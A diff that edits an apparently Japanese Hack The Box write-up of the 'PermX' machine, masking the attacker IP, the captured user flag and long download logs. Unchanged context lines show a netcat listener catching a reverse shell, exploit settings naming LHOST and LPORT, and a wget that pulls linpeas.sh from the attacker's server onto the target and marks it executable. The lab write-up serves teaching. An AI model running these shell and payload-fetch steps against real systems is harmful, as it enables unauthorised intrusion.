@@ -92,9 +92,7 @@ https://www.security-next.com/151526
 ┌──(kali㉿kali)-[~]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
-connect to [10.10.14.33] from (UNKNOWN) [10.10.11.23] 35394
-bash: cannot set terminal process group (1173): Inappropriate ioctl for device
-bash: no job control in this shell
+
 www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -110,7 +108,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 HOST='http://lms.permx.htb' 
 
 # 攻撃者のマシン (HTBのVPN接続時は tun0 のIP)
-LHOST='10.10.14.33'
+LHOST='xx.xx.xx.xx'
 LPORT=4444
 
 # アップロード先
@@ -215,21 +213,7 @@ home/kaliにインストール
 ──(kali㉿kali)-[~]
 └─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 --2025-03-26 02:35:31--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
-Resolving github.com (github.com)... 20.27.177.113
-Connecting to github.com (github.com)|20.27.177.113|:443... connected.
-HTTP request sent, awaiting response... 301 Moved Permanently
-Location: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh [following]
---2025-03-26 02:35:34--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
-Reusing existing connection to github.com:443.
-HTTP request sent, awaiting response... 302 Found
-Location: https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/linpeas.sh [following]
---2025-03-26 02:35:34--  https://github.com/peass-ng/PEASS-ng/releases/download/20250320-91fb36a0/linpeas.sh
-Reusing existing connection to github.com:443.
-HTTP request sent, awaiting response... 302 Found
-Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ec48ca87-1ec6-4880-85e8-2086d896187d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250325%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250325T173535Z&X-Amz-Expires=300&X-Amz-Signature=5f472acf5cb6dedf6458d4a358119f145aa1d114466523f20a1406dacfe9fcd3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
---2025-03-26 02:35:35--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/ec48ca87-1ec6-4880-85e8-2086d896187d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250325%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250325T173535Z&X-Amz-Expires=300&X-Amz-Signature=5f472acf5cb6dedf6458d4a358119f145aa1d114466523f20a1406dacfe9fcd3&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
-Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
-Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
+...
 HTTP request sent, awaiting response... 200 OK
 Length: 840082 (820K) [application/octet-stream]
 Saving to: ‘linpeas.sh’
@@ -251,17 +235,11 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 ww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ cd /tmp
 <lo/main/inc/lib/javascript/bigupload/files$ cd /tmp                     
-www-data@permx:/tmp$ wget http://10.10.14.33:8080/linpeas.sh -O linpeas.sh
-wget http://10.10.14.33:8080/linpeas.sh -O linpeas.sh
---2025-03-25 17:36:56--  http://10.10.14.33:8080/linpeas.sh
-Connecting to 10.10.14.33:8080... connected.
+...
+Connecting ... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 840082 (820K) [text/x-sh]
 Saving to: ‘linpeas.sh’
-
-linpeas.sh          100%[===================>] 820.39K   166KB/s    in 5.6s    
-
-2025-03-25 17:37:02 (146 KB/s) - ‘linpeas.sh’ saved [840082/840082]
 
 www-data@permx:/tmp$ chmod +x linpeas.sh
 chmod +x linpeas.sh
@@ -380,14 +358,13 @@ See https://ubuntu.com/esm or run: sudo pro status
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
-Last login: Mon Jul  1 13:09:13 2024 from 10.10.14.40
 ```
 
 ### user.txt
 ```
 mtz@permx:~$ cat user.txt
 cat user.txt
-68cef58ec67838e6b2e530838eeed25c
+68c*****************************
 ```
 
 
